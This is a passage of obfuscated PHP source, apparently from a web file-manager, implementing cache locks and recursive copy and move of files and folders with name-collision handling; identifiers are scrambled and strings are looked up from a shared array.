$‹öÎÖñ[100] => $this->pathInfoFilter($æã¢’Ñ…)); if (!$Ìû¥Ç™[$‹öÎÖñ[494]]) { $Ìû¥Ç™[$‹öÎÖñ[550]] = $æã¢’Ñ…[$‹öÎÖñ[550]]; } $ìğÅßïÅ[] = $Ìû¥Ç™; } $ìğÅßïÅ = array_sort_by($ìğÅßïÅ, $‹öÎÖñ[97]); return $ìğÅßïÅ; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($öÚ°Óú) { $‰ïÉ¼¾ş =& $_SERVER[÷ôÚîå]; if (!$this->allowLock()) { return; } $this->_lockCheck($‰ïÉ¼¾ş[627], $öÚ°Óú); $¿—Ò°Ğ› = 1; $this->_lockEvent($öÚ°Óú, array($‰ïÉ¼¾ş[628], $‰ïÉ¼¾ş[629]), $¿—Ò°Ğ›); $this->_lockParent($öÚ°Óú, array($‰ïÉ¼¾ş[629]), $¿—Ò°Ğ›); $this->_lockEvent($öÚ°Óú, array($‰ïÉ¼¾ş[630], $‰ïÉ¼¾ş[631]), $¿—Ò°Ğ›); $this->_lockCheckEnd($‰ïÉ¼¾ş[627], $öÚ°Óú); } public function lockCopyEnd($‰™ß—ã‰) { $îìšòê’ =& $_SERVER[÷ôÚîå]; if (!$this->allowLock()) { return; } $ş³ËÑÜ = 0; $this->_lockEvent($‰™ß—ã‰, array($îìšòê’[628], $îìšòê’[629]), $ş³ËÑÜ); $this->_lockParent($‰™ß—ã‰, array($îìšòê’[629]), $ş³ËÑÜ); $this->_lockEvent($‰™ß—ã‰, array($îìšòê’[630], $îìšòê’[631]), $ş³ËÑÜ); } public function lockWriteStart($áÊ°ĞÈ, $óâ·Û¡ö = '') { $‡ÏúË‚ =& $_SERVER[÷ôÚîå]; if (!$this->allowLock()) { return; } $this->_lockCheck($‡ÏúË‚[628], $áÊ°ĞÈ); $êæç²ó = 1; $this->_lockKey($‡ÏúË‚[632] . $áÊ°ĞÈ . $‡ÏúË‚[10] . $óâ·Û¡ö, $êæç²ó); $this->_lockEvent($áÊ°ĞÈ, array($‡ÏúË‚[627], $‡ÏúË‚[629]), $êæç²ó); $this->_lockParent($áÊ°ĞÈ, array($‡ÏúË‚[627], $‡ÏúË‚[629]), $êæç²ó); $this->_lockCheckEnd($‡ÏúË‚[628], $áÊ°ĞÈ); } public function lockWriteEnd($ü—»÷–Ø, $»Šµ‰ÁÕ = '') { $Ü•ÔÕğ™ =& $_SERVER[÷ôÚîå]; if (!$this->allowLock()) { return; } $›ÛÄØ°ç = 0; $this->_lockKey($Ü•ÔÕğ™[632] . $ü—»÷–Ø . $Ü•ÔÕğ™[10] . $»Šµ‰ÁÕ, $›ÛÄØ°ç); $this->_lockEvent($ü—»÷–Ø, array($Ü•ÔÕğ™[627], $Ü•ÔÕğ™[629]), $›ÛÄØ°ç); $this->_lockParent($ü—»÷–Ø, array($Ü•ÔÕğ™[627], $Ü•ÔÕğ™[629]), $›ÛÄØ°ç); } public function lockMoveStart($È÷»úË±) { $´Ö·ü ø =& $_SERVER[÷ôÚîå]; if (!$this->allowLock()) { return; } $this->_lockCheck($´Ö·ü ø[629], $È÷»úË±); $Ì´îıŸÓ = 1; $this->_lockKey($´Ö·ü ø[633] . $È÷»úË±, $Ì´îıŸÓ); $this->_lockEvent($È÷»úË±, array($´Ö·ü ø[627], $´Ö·ü ø[628]), $Ì´îıŸÓ); $this->_lockParent($È÷»úË±, array($´Ö·ü ø[627], $´Ö·ü ø[629]), $Ì´îıŸÓ); $this->_lockEvent($È÷»úË±, array($´Ö·ü ø[634], $´Ö·ü ø[630], $´Ö·ü ø[631]), $Ì´îıŸÓ); $this->_lockCheckEnd($´Ö·ü ø[629], $È÷»úË±); } public function lockMoveEnd($ä½¤İó) { $ÕèÄ¤Ñá =& $_SERVER[÷ôÚîå]; if (!$this->allowLock()) { return; } $ôµÇù§º = 0; $this->_lockKey($ÕèÄ¤Ñá[633] . $ä½¤İó, $ôµÇù§º); $this->_lockEvent($ä½¤İó, array($ÕèÄ¤Ñá[627], $ÕèÄ¤Ñá[628]), $ôµÇù§º); $this->_lockParent($ä½¤İó, array($ÕèÄ¤Ñá[627], $ÕèÄ¤Ñá[629]), $ôµÇù§º); $this->_lockEvent($ä½¤İó, array($ÕèÄ¤Ñá[634], $ÕèÄ¤Ñá[630], $ÕèÄ¤Ñá[631]), $ôµÇù§º); } private function _lockCheck($°ãˆ»ıÔ, $È…îä÷) { $î„¨ãÜÏ =& $_SERVER[÷ôÚîå]; $²í´Şèş = $this->sourceInfo($È…îä÷); $¹µÒËÁÇ = $°ãˆ»ıÔ . $î„¨ãÜÏ[10] . $È…îä÷; $this->_lockTimeStart[$¹µÒËÁÇ] = timeFloat(); if (!is_array($²í´Şèş)) { return; } $ôÉ¬£´ = LNG($î„¨ãÜÏ[635]); CacheLock::setErrorMsg($î„¨ãÜÏ[186] . htmlspecialchars($²í´Şèş[$î„¨ãÜÏ[32]]) . $î„¨ãÜÏ[188] . $ôÉ¬£´); $this->_lockKey($¹µÒËÁÇ, 1); $this->_lockKey($¹µÒËÁÇ, 0); $Ë§æå® = array_reverse($this->parentLevelArray($²í´Şèş[$î„¨ãÜÏ[593]])); foreach ($Ë§æå® as $ƒñßõÍ) { $¹µÒËÁÇ = $°ãˆ»ıÔ . $î„¨ãÜÏ[636] . $ƒñßõÍ; if (CacheLock::lockGet($î„¨ãÜÏ[637] . $¹µÒËÁÇ)) { $²í´Şèş = $this->sourceInfo($ƒñßõÍ); CacheLock::setErrorMsg($î„¨ãÜÏ[186] . htmlspecialchars($²í´Şèş[$î„¨ãÜÏ[32]]) . $î„¨ãÜÏ[188] . $ôÉ¬£´); $this->_lockKey($¹µÒËÁÇ, 1); $this->_lockKey($¹µÒËÁÇ, 0); } } } private function _lockCheckEnd($àäö‡’, $ı˜¦ƒ÷) { $¹Ü£·Ò£ =& $_SERVER[÷ôÚîå]; $¬áé½Ÿ = $àäö‡’ . $¹Ü£·Ò£[10] . $ı˜¦ƒ÷; CacheLock::setErrorMsg($¹Ü£·Ò£[463]); if (!isset($this->_lockTimeStart[$¬áé½Ÿ])) { return; } $À¶µÖä = timeFloat() - $this->_lockTimeStart[$¬áé½Ÿ]; unset($this->_lockTimeStart[$¬áé½Ÿ]); if ($À¶µÖä > 0.5) { unset(self::$cacheSourceInfo[$¹Ü£·Ò£[542] . $ı˜¦ƒ÷]); } $×ú›–»ô = $this->sourceInfo($ı˜¦ƒ÷); if (!$×ú›–»ô) { show_json(LNG($¹Ü£·Ò£[118]), !1); } } private function _lockParent($ÈİšŒô’, $Ï•ß¨¹¿, $­ÉÃ‚©€) { if (!$this->autoLockSet) { return; } $ÄÊòã‘‚ = $this->sourceInfo($ÈİšŒô’); if (!is_array($ÄÊòã‘‚)) { return; } $±œğß…Ë = array_reverse($this->parentLevelArray($ÄÊòã‘‚[$_SERVER[÷ôÚîå][593]])); foreach ($±œğß…Ë as $Ñ—–§‘İ) { $this->_lockEvent($Ñ—–§‘İ, $Ï•ß¨¹¿, $­ÉÃ‚©€); } } private function _lockEvent($Ìå‹¶¯, $ô‡ë­Ù†, $ÂüÏ”Ï) { $Ô¨†öÙ =& $_SERVER[÷ôÚîå]; if (!$this->autoLockSet) { return; } foreach ($ô‡ë­Ù† as $ì¦ßÀ¼…) { $Ş½Æ¹ñÄ = $ì¦ßÀ¼… . $Ô¨†öÙ[10] . $Ìå‹¶¯; if ($ÂüÏ”Ï && CacheLock::lockGet($Ô¨†öÙ[637] . $Ş½Æ¹ñÄ)) { continue; } $this->_lockKey($Ş½Æ¹ñÄ, $ÂüÏ”Ï); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($—ˆõÌŸŸ, $ÖÈ«åÙŸ = 1) { $ö’şæ ˆ = $_SERVER[÷ôÚîå][637] . md5($—ˆõÌŸŸ); if ($ÖÈ«åÙŸ) { if (isset(self::$_lockItemArr[$ö’şæ ˆ])) { return; } self::$_lockItemArr[$ö’şæ ˆ] = 1; CacheLock::lock($ö’şæ ˆ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$ö’şæ ˆ])) { return; } unset(self::$_lockItemArr[$ö’şæ ˆ]); CacheLock::unlock($ö’şæ ˆ); } } public function isParentOf($›ÁÄ·¯, $¼ÁØ…ÅÜ) { $ğ†ëäØÕ =& $_SERVER[÷ôÚîå]; $¸‘È‚ìÆ = $this->sourceInfo($›ÁÄ·¯); $÷ò¸òúô = $this->sourceInfo($¼ÁØ…ÅÜ); $¥Úğ­²â = $¸‘È‚ìÆ[$ğ†ëäØÕ[593]] . $¸‘È‚ìÆ[$ğ†ëäØÕ[203]] . $ğ†ëäØÕ[50]; $»½î½«ı = $÷ò¸òúô[$ğ†ëäØÕ[593]] . $÷ò¸òúô[$ğ†ëäØÕ[203]] . $ğ†ëäØÕ[50]; $Õ¨ó’Šà = strpos($»½î½«ı, $¥Úğ­²â) === 0; return $Õ¨ó’Šà; } private $targetIsDelete = 0; public function copy($éü‚«ƒõ, $™ÊÎ’Šè, $–´§—½ß = REPEAT_REPLACE, $¢üõ¹Å– = '') { $®Ä»¾Ç‚ =& $_SERVER[÷ôÚîå]; $Œñ³š¥ = $this->sourceInfo($éü‚«ƒõ); $Ğ¾›Ëß± = $this->sourceInfo($™ÊÎ’Šè); if (!$Œñ³š¥ || !$Ğ¾›Ëß± || $Ğ¾›Ëß±[$®Ä»¾Ç‚[494]] != $®Ä»¾Ç‚[101]) { return !1; } if ($this->isParentOf($éü‚«ƒõ, $™ÊÎ’Šè)) { return !1; } $Òüå¡üì = $¢üõ¹Å– ? $¢üõ¹Å– : $Œñ³š¥[$®Ä»¾Ç‚[32]]; $this->lockCopyStart($éü‚«ƒõ); $this->lockWriteStart($™ÊÎ’Šè, $Òüå¡üì); $í©—Ùğº = array($®Ä»¾Ç‚[638] => array(), $®Ä»¾Ç‚[639] => array(), $®Ä»¾Ç‚[640] => array()); $this->targetIsDelete = intval($Œñ³š¥[$®Ä»¾Ç‚[514]]); $»ÃÓ¨àò = $this->fileNameExistAuto($™ÊÎ’Šè, $Œñ³š¥); $íà„´¬† = $this->_copy($éü‚«ƒõ, $™ÊÎ’Šè, $–´§—½ß, $í©—Ùğº, !0, $¢üõ¹Å–); $this->_childrenListClear(); $this->lockCopyEnd($éü‚«ƒõ); $this->lockWriteEnd($™ÊÎ’Šè, $Òüå¡üì); if ($Œñ³š¥[$®Ä»¾Ç‚[494]] == $®Ä»¾Ç‚[101] && $»ÃÓ¨àò == $íà„´¬†) { $this->folderSizeResetChildren($»ÃÓ¨àò); } Model($®Ä»¾Ç‚[641])->addAll($í©—Ùğº[$®Ä»¾Ç‚[639]], array(), !0); if ($»ÃÓ¨àò != $íà„´¬† || $Œñ³š¥[$®Ä»¾Ç‚[494]] == $®Ä»¾Ç‚[101]) { Model($®Ä»¾Ç‚[642])->eventCopy($íà„´¬†); } $this->saveAll($í©—Ùğº[$®Ä»¾Ç‚[640]]); Model($®Ä»¾Ç‚[240])->linkAdd($í©—Ùğº[$®Ä»¾Ç‚[638]]); $this->folderSizeReset($™ÊÎ’Šè); $this->updateModifyTime($™ÊÎ’Šè); return $íà„´¬†; } private function _copy($Êêù‡Š†, $à’öÅä¾, $Íå†øæº, &$šÓ×ŠÆ, $¬µåµ§, $ëëÓ±‰ = '') { $ÛçĞó›† =& $_SERVER[÷ôÚîå]; $ôÅ ß³ = $this->sourceInfoCache($Êêù‡Š†); $¾ÄŞ”¬ = $ôÅ ß³[$ÛçĞó›†[494]] == $ÛçĞó›†[101]; $ˆòÕ¢Ãš = $ëëÓ±‰ ? $ëëÓ±‰ : $ôÅ ß³[$ÛçĞó›†[32]]; $ÌÆ‚ƒ®õ = $this->fileNameExistAuto($à’öÅä¾, $ôÅ ß³); if ($¬µåµ§) { $this->_childrenAllMake($Êêù‡Š†); if ($¾ÄŞ”¬ && $ÌÆ‚ƒ®õ) { $this->_childrenAllMake($ÌÆ‚ƒ®õ); } } if (!$ÌÆ‚ƒ®õ) { return $this->_copyCreate($Êêù‡Š†, $à’öÅä¾, $ˆòÕ¢Ãš, $šÓ×ŠÆ); } $Â€Ïúë» = $ÌÆ‚ƒ®õ; if ($¾ÄŞ”¬) { if ($Íå†øæº == REPEAT_RENAME_FOLDER) { $ˆòÕ¢Ãš = $this->fileNameAutoCache($à’öÅä¾, $ˆòÕ¢Ãš, $Íå†øæº, $¾ÄŞ”¬); $Â€Ïúë» = $this->_copyCreate($Êêù‡Š†, $à’öÅä¾, $ˆòÕ¢Ãš, $šÓ×ŠÆ); } else { $Û¯Û»ë× = $this->_childrenList($Êêù‡Š†); foreach ($Û¯Û»ë× as $á‚ª¸ğè) { $this->_copy($á‚ª¸ğè[$ÛçĞó›†[203]], $ÌÆ‚ƒ®õ, $Íå†øæº, $šÓ×ŠÆ, !1); } } } else { if ($Íå†øæº == REPEAT_RENAME || $Íå†øæº == REPEAT_RENAME_FOLDER) { $ˆòÕ¢Ãš = $this->fileNameAutoCache($à’öÅä¾, $ˆòÕ¢Ãš, $Íå†øæº, $¾ÄŞ”¬); $Â€Ïúë» = $this->_copyCreate($Êêù‡Š†, $à’öÅä¾, $ˆòÕ¢Ãš, $šÓ×ŠÆ); } else { if ($Íå†øæº == REPEAT_REPLACE) { $ÚğÔíÏ€ = $this->sourceInfoCache($ÌÆ‚ƒ®õ); $ËÌû¬‡ = $this->fileHistory($ÚğÔíÏ€, $ôÅ ß³[$ÛçĞó›†[550]], $ôÅ ß³[$ÛçĞó›†[89]]); if ($ËÌû¬‡) { $šÓ×ŠÆ[$ÛçĞó›†[638]][] = $ôÅ ß³[$ÛçĞó›†[550]]; } } else { if ($Íå†øæº == REPEAT_SKIP) { } } } Hook::trigger($ÛçĞó›†[643], array($ÛçĞó›†[644], $ôÅ ß³, 0)); } return $Â€Ïúë»; } private function _copyCreate($Ó—Ğ°Œ‘, $ÚÃÖ‰›Ï, $‰Ğ”ğâö, &$ƒ×öòí) { $Æ÷É…Ìú =& $_SERVER[÷ôÚîå]; $¸ù¿ÕÁ = $this->sourceInfoCache($Ó—Ğ°Œ‘); $£úœòä = $this->sourceInfoCache($ÚÃÖ‰›Ï); $ï¼¯Ï¢ = $this->_makeItemData($¸ù¿ÕÁ, $£úœòä, $‰Ğ”ğâö); Hook::trigger($Æ÷É…Ìú[645], $ï¼¯Ï¢); Hook::trigger($Æ÷É…Ìú[646], array($Æ÷É…Ìú[647], $ï¼¯Ï¢, 0)); $ÊÒ€¾„È = $this->add($ï¼¯Ï¢); $‘¹àÈñ¢ = array($Æ÷É…Ìú[203] => $ÊÒ€¾„È, $Æ÷É…Ìú[32] => $‰Ğ”ğâö); $this->_copyApplyMeta($‘¹àÈñ¢, $ƒ×öòí); if ($¸ù¿ÕÁ[$Æ÷É…Ìú[494]] != $Æ÷É…Ìú[101]) { $ƒ×öòí[$Æ÷É…Ìú[638]][] = $¸ù¿ÕÁ[$Æ÷É…Ìú[550]]; return $ÊÒ€¾„È; } $¿ßÎşÌ¼ = array(); $™ªõÄç = array(); $this->_childrenListAll($Ó—Ğ°Œ‘, $¿ßÎşÌ¼); $”ÂÄ‹†Ú = count($¿ßÎşÌ¼); if ($”ÂÄ‹†Ú == 0) { return $ÊÒ€¾„È; } $ôÎƒ° â = $this->sourceInfo($ÊÒ€¾„È); foreach ($¿ßÎşÌ¼ as $ë‰‰‡ø¸) { $òØÊŸ¤µ = $this->_makeItemData($ë‰‰‡ø¸, $ôÎƒ° â, $ë‰‰‡ø¸[$Æ÷É…Ìú[32]]); $òØÊŸ¤µ[$Æ÷É…Ìú[593]] = $ë‰‰‡ø¸[$Æ÷É…Ìú[593]]; $™ªõÄç[] = $òØÊŸ¤µ; } $this->chunkEventSet($Æ÷É…Ìú[648], array($Æ÷É…Ìú[649], $ï¼¯Ï¢, $”ÂÄ‹†Ú)); $this->addAll($™ªõÄç, array(), !1); $‰Šáº‚° = $this->where(array($Æ÷É…Ìú[202] => $ÊÒ€¾„È))->select(); $¢ƒ¶½»ê = $this->_childrenMakeRelation($¿ßÎşÌ¼, $‰Šáº‚°); $¢ƒ¶½»ê[$Ó—Ğ°Œ‘] = $ÊÒ€¾„È; $Ù¶ šÅ = array(); $Íô¦İ„ş = array(); foreach ($‰Šáº‚° as $ë‰‰‡ø¸) { $”ë¼øÆ† = $ë‰‰‡ø¸[$Æ÷É…Ìú[203]]; $’ÁµËâİ = $this->_childrenMatch($¢ƒ¶½»ê, $ë‰‰‡ø¸, $ôÎƒ° â); $Ù¶ šÅ[] = array($Æ÷É…Ìú[203], $”ë¼øÆ†, $Æ÷É…Ìú[202], $’ÁµËâİ[$Æ÷É…Ìú[202]]); $Íô¦İ„ş[] = array($Æ÷É…Ìú[203], $”ë¼øÆ†, $Æ÷É…Ìú[593], $’ÁµËâİ[$Æ÷É…Ìú[593]]); $this->_copyApplyMeta($ë‰‰‡ø¸, $ƒ×öòí); if ($ë‰‰‡ø¸[$Æ÷É…Ìú[494]] != $Æ÷É…Ìú[101]) { $ƒ×öòí[$Æ÷É…Ìú[638]][] = $ë‰‰‡ø¸[$Æ÷É…Ìú[550]]; } } $this->chunkEventSet($Æ÷É…Ìú[650], array($Æ÷É…Ìú[651], $ï¼¯Ï¢, $”ÂÄ‹†Ú)); $this->saveAll($Ù¶ šÅ); $this->chunkEventSet($Æ÷É…Ìú[652], array($Æ÷É…Ìú[653], $ï¼¯Ï¢, $”ÂÄ‹†Ú)); $this->saveAll($Íô¦İ„ş); return $ÊÒ€¾„È; } private function _childrenMakeRelation($òùï¸§«, $šìÌ•å÷) { $¦ñæ Ö =& $_SERVER[÷ôÚîå]; $²ˆ‹†€ë = array(); $‰€ñ¿¾ = array(); foreach ($òùï¸§« as $Æ²´ë“) { $ªÁ¢ÓÔÌ = $Æ²´ë“[$¦ñæ Ö[32]] . $¦ñæ Ö[8] . $Æ²´ë“[$¦ñæ Ö[593]]; $²ˆ‹†€ë[$ªÁ¢ÓÔÌ] = $Æ²´ë“[$¦ñæ Ö[203]]; } foreach ($šìÌ•å÷ as $Æ²´ë“) { $ªÁ¢ÓÔÌ = $Æ²´ë“[$¦ñæ Ö[32]] . $¦ñæ Ö[8] . $Æ²´ë“[$¦ñæ Ö[593]]; $óØì§Ö£ = $²ˆ‹†€ë[$ªÁ¢ÓÔÌ]; $‰€ñ¿¾[$óØì§Ö£] = $Æ²´ë“[$¦ñæ Ö[203]]; } return $‰€ñ¿¾; } private function _childrenMatch($©ìï­Â², $É˜“ãë•, $à†¤âûû) { $²ìåñÊ¼ =& $_SERVER[÷ôÚîå]; $Å†–¹ÔÑ = $à†¤âûû[$²ìåñÊ¼[593]]; $Ÿ”¼…Ó = $this->parentLevelArray($É˜“ãë•[$²ìåñÊ¼[593]]); foreach ($Ÿ”¼…Ó as $§§®£½) { if (isset($©ìï­Â²[$§§®£½])) { $Å†–¹ÔÑ .= $©ìï­Â²[$§§®£½] . $²ìåñÊ¼[654]; } } $Å†–¹ÔÑ = rtrim($Å†–¹ÔÑ, $²ìåñÊ¼[50]) . $²ìåñÊ¼[50]; $îûÀôô¼ = $this->parentLevelArray($Å†–¹ÔÑ); $²‚§Ÿô® = $îûÀôô¼[count($îûÀôô¼) - 1]; return array($²ìåñÊ¼[202] => $²‚§Ÿô®, $²ìåñÊ¼[593] => $Å†–¹ÔÑ); } private function _makeItemData($î®…ëŞË, $äÚéØÅ, $Ïå£ÑŠ) { $Íííè‚è =& $_SERVER[÷ôÚîå]; $ÃÑşÉæ = array($Íííè‚è[655] => $î®…ëŞË[$Íííè‚è[494]], $Íííè‚è[503] => $Ïå£ÑŠ, $Íííè‚è[656] => $î®…ëŞË[$Íííè‚è[495]] ? $î®…ëŞË[$Íííè‚è[495]] : $Íííè‚è[12], $Íííè‚è[551] => $î®…ëŞË[$Íííè‚è[550]] ? $î®…ëŞË[$Íííè‚è[550]] : 0, $Íííè‚è[626] => $î®…ëŞË[$Íííè‚è[89]] ? $î®…ëŞË[$Íííè‚è[89]] : 0, $Íííè‚è[657] => intval($äÚéØÅ[$Íííè‚è[200]]), $Íííè‚è[658] => intval($äÚéØÅ[$Íííè‚è[578]]), $Íííè‚è[659] => intval(USER_ID), $Íííè‚è[660] => intval(USER_ID), $Íííè‚è[486] => intval($äÚéØÅ[$Íííè‚è[203]]), $Íííè‚è[661] => $äÚéØÅ[$Íííè‚è[593]] . $äÚéØÅ[$Íííè‚è[203]] . $Íííè‚è[50], $Íííè‚è[507] => $î®…ëŞË[$Íííè‚è[98]] ? $î®…ëŞË[$Íííè‚è[98]] : time(), $Íííè‚è[513] => 0, $Íííè‚è[662] => $Íííè‚è[12]); return $ÃÑşÉæ; } private function _copyApplyMeta($¾¥Ğ , &$ÉÜí°ùÓ) { $ˆÔú“£ó =& $_SERVER[÷ôÚîå]; $¸­‘Ú»ñ = $¾¥Ğ [$ˆÔú“£ó[203]]; $ÖıèŸ‹ = $¾¥Ğ [$ˆÔú“£ó[32]]; if (!isset($¾¥Ğ [$ˆÔú“£ó[663]]) || !$¾¥Ğ [$ˆÔú“£ó[663]] || $¾¥Ğ [$ˆÔú“£ó[663]] == $ˆÔú“£ó[238]) { $ÉÜí°ùÓ[$ˆÔú“£ó[640]][] = array($ˆÔú“£ó[203], $¸­‘Ú»ñ, $ˆÔú“£ó[663], short_id($¸­‘Ú»ñ)); } if (Input::check($ÖıèŸ‹, $ˆÔú“£ó[664])) { $ÉÜí°ùÓ[$ˆÔú“£ó[639]][] = array($ˆÔú“£ó[203] => $¸­‘Ú»ñ, $ˆÔú“£ó[107] => $ˆÔú“£ó[547], $ˆÔú“£ó[459] => str_replace($ˆÔú“£ó[53], $ˆÔú“£ó[12], Pinyin::get($ÖıèŸ‹))); $ÉÜí°ùÓ[$ˆÔú“£ó[639]][] = array($ˆÔú“£ó[203] => $¸­‘Ú»ñ, $ˆÔú“£ó[107] => $ˆÔú“£ó[546], $ˆÔú“£ó[459] => Pinyin::get($ÖıèŸ‹, $ˆÔú“£ó[665])); } $ÉÜí°ùÓ[$ˆÔú“£ó[639]][] = array($ˆÔú“£ó[203] => $¸­‘Ú»ñ, $ˆÔú“£ó[107] => $ˆÔú“£ó[526], $ˆÔú“£ó[459] => KodSort::makeStr($ÖıèŸ‹)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ŒÊ“™Óñ) { $»¹ğÇ =& $_SERVER[÷ôÚîå]; $×µÖª„Ğ = $this->sourceInfo($ŒÊ“™Óñ); $İ–Éõ¬İ = $»¹ğÇ[666]; $øØŸİÌİ = array($»¹ğÇ[593] => array($»¹ğÇ[621], $×µÖª„Ğ[$»¹ğÇ[593]] . $ŒÊ“™Óñ . $»¹ğÇ[622]), $»¹ğÇ[514] => $this->targetIsDelete); $•Ö´ÀëÌ = $this->field($İ–Éõ¬İ)->where($øØŸİÌİ)->select(); if (!$•Ö´ÀëÌ) { return; } $•Ö´ÀëÌ = array_to_keyvalue($•Ö´ÀëÌ, $»¹ğÇ[203]); foreach ($•Ö´ÀëÌ as $âŠº¸Àú) { $ˆŠ•ÒÌ± = $âŠº¸Àú[$»¹ğÇ[202]]; $ŒÊ“™Óñ = $âŠº¸Àú[$»¹ğÇ[203]]; if (!isset($this->_childrenListCache[$ŒÊ“™Óñ]) && $âŠº¸Àú[$»¹ğÇ[494]] == $»¹ğÇ[101]) { $this->_childrenListCache[$ŒÊ“™Óñ] = array(); } if (!isset($this->_childrenListCache[$ˆŠ•ÒÌ±])) { $this->_childrenListCache[$ˆŠ•ÒÌ±] = array(); } $this->_childrenListCache[$ˆŠ•ÒÌ±][$ŒÊ“™Óñ] = $âŠº¸Àú; $this->_childrenItemCache[$ŒÊ“™Óñ] = $âŠº¸Àú; } } private function _childrenListAll($Ş÷ÎÅ×¿, &$ÀÖÚÖæ¡) { $¡Ê”Áºˆ =& $_SERVER[÷ôÚîå]; if (!isset($this->_childrenListCache[$Ş÷ÎÅ×¿])) { return; } $¯å»› = $this->_childrenListCache[$Ş÷ÎÅ×¿]; foreach ($¯å»› as $¾Ë¼­·Ë => $²õåªÀÙ) { $ÀÖÚÖæ¡[$¾Ë¼­·Ë] = $²õåªÀÙ; if ($²õåªÀÙ[$¡Ê”Áºˆ[494]] == $¡Ê”Áºˆ[101]) { $this->_childrenListAll($¾Ë¼­·Ë, $ÀÖÚÖæ¡); } } } private function sourceInfoCache($š„³í½§) { if (isset($this->_childrenItemCache[$š„³í½§])) { return $this->_childrenItemCache[$š„³í½§]; } return $this->sourceInfo($š„³í½§); } private function _childrenList($Š«À¯•Ù) { if (isset($this->_childrenListCache[$Š«À¯•Ù])) { return $this->_childrenListCache[$Š«À¯•Ù]; } return $this->_childrenListSelect($Š«À¯•Ù); } private function _childrenListSelect($‘áŸİÏº) { $î‘ü»³´ =& $_SERVER[÷ôÚîå]; $¹ê˜ÌÔ¡ = array($î‘ü»³´[202] => $‘áŸİÏº, $î‘ü»³´[514] => $this->targetIsDelete); $îâ²»‘¥ = $this->where($¹ê˜ÌÔ¡)->select(); $îâ²»‘¥ = $îâ²»‘¥ ? $îâ²»‘¥ : array(); $¦õŸ›¥á = array_to_keyvalue($îâ²»‘¥, $î‘ü»³´[203]); $this->_childrenListCache[$‘áŸİÏº] = $¦õŸ›¥á; foreach ($¦õŸ›¥á as $‘áŸİÏº => $ÎÄò±ù) { $this->_childrenItemCache[$‘áŸİÏº] = $ÎÄò±ù; } return $¦õŸ›¥á; } private function fileNameExistAuto($Å‘€İ¸, $¹°Á›ò°) { $š·ë€¿ˆ =& $_SERVER[÷ôÚîå]; if ($¹°Á›ò°[$š·ë€¿ˆ[514]] == $š·ë€¿ˆ[101]) { return $this->fileNameExist($Å‘€İ¸, $¹°Á›ò°[$š·ë€¿ˆ[32]]); } return $this->fileNameExistCache($Å‘€İ¸, $¹°Á›ò°[$š·ë€¿ˆ[32]]); } private function fileNameExistCache($Ìİ éˆ², $—§§¨Éí) { $œÏçÜ¾è =& $_SERVER[÷ôÚîå]; $—§§¨Éí = strtolower($—§§¨Éí); $Õ¬§º¯Ä = $this->_childrenList($Ìİ éˆ²); foreach ($Õ¬§º¯Ä as $¬£†ú­Á) { if ($—§§¨Éí == strtolower($¬£†ú­Á[$œÏçÜ¾è[32]])) { return $¬£†ú­Á[$œÏçÜ¾è[203]]; } } return !1; } private function fileNameAutoCache($İ‚ŠŠ¨‚, $Ò½×¡å, $Œ–±õ³ì, $õØ‘¥ÎÕ) { $ÃÓì€Í =& $_SERVER[÷ôÚîå]; $ˆ×¬¬öé = $this->_childrenList($İ‚ŠŠ¨‚); $»ÌË¤… = array_to_keyvalue($ˆ×¬¬öé, $ÃÓì€Í[12], $ÃÓì€Í[32]); return $this->fileNameAutoGet($»ÌË¤…, $Ò½×¡å, $Œ–±õ³ì, $õØ‘¥ÎÕ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($¼µ†õË , $’È¬ïĞÉ, $°ĞÙÜê = REPEAT_REPLACE, $‹Ëñ„§É = '') { $°ßì›… =& $_SERVER[÷ôÚîå]; $™é¦ıøï = $this->sourceInfo($¼µ†õË ); $ÌÈ±âÌœ = $this->sourceInfo($’È¬ïĞÉ); if ($™é¦ıøï[$°ßì›…[202]] == $ÌÈ±âÌœ[$°ßì›…[203]]) { if ($™é¦ıøï[$°ßì›…[514]] == $°ßì›…[101]) { Model($°ßì›…[512])->restore(array($¼µ†õË )); } if (!$‹Ëñ„§É || $‹Ëñ„§É == $™é¦ıøï[$°ßì›…[32]]) { return $¼µ†õË ; } } $¯ôê…é¤ = $this->pathInfoMore($¼µ†õË ); if ($this->isParentOf($¼µ†õË , $’È¬ïĞÉ)) { return !1; } if (!$™é¦ıøï || !$ÌÈ±âÌœ || $ÌÈ±âÌœ[$°ßì›…[494]] != $°ßì›…[101]) { return !1; } Hook::trigger($°ßì›…[667], $¯ôê…é¤); $this->targetIsDelete = intval($™é¦ıøï[$°ßì›…[514]]); if ($™é¦ıøï[$°ßì›…[202]] == $’È¬ïĞÉ && $‹Ëñ„§É != $™é¦ıøï[$°ßì›…[32]]) { $…¬é·ä = $this->fileNameExist($’È¬ïĞÉ, $‹Ëñ„§É); if ($…¬é·ä && $™é¦ıøï[$°ßì›…[494]] == $°ßì›…[238]) { $­ãÊ«è¦ = $this->sourceInfo($…¬é·ä); $Ù’·›À® = $this->fileHistory($­ãÊ«è¦, $™é¦ıøï[$°ßì›…[550]], $™é¦ıøï[$°ßì›…[89]]); if (!$Ù’·›À®) { Model($°ßì›…[553])->remove($™é¦ıøï[$°ßì›…[550]]); } $this->removeNow($¼µ†õË , !1); $this->folderSizeReset($’È¬ïĞÉ); Hook::trigger($°ßì›…[668], $¯ôê…é¤); return $…¬é·ä; } } $‡¯¯ÕÁ° = $‹Ëñ„§É ? $‹Ëñ„§É : $™é¦ıøï[$°ßì›…[32]]; $this->lockMoveStart($¼µ†õË ); $this->lockWriteStart($’È¬ïĞÉ, $‡¯¯ÕÁ°); $ê­«—å¢ = array($°ßì›…[638] => array(), $°ßì›…[669] => !1); $this->clearShare($¼µ†õË , $’È¬ïĞÉ); $²´‰®¢ = $this->fileNameExistAuto($’È¬ïĞÉ, $™é¦ıøï); $æñĞÑ“á = $this->_move($¼µ†õË , $’È¬ïĞÉ, $°ĞÙÜê, $ê­«—å¢, $‹Ëñ„§É); $this->sourceCacheClear(); if ($™é¦ıøï[$°ßì›…[494]] == $°ßì›…[101] && $²´‰®¢) { $this->folderSizeResetChildren($æñĞÑ“á); } 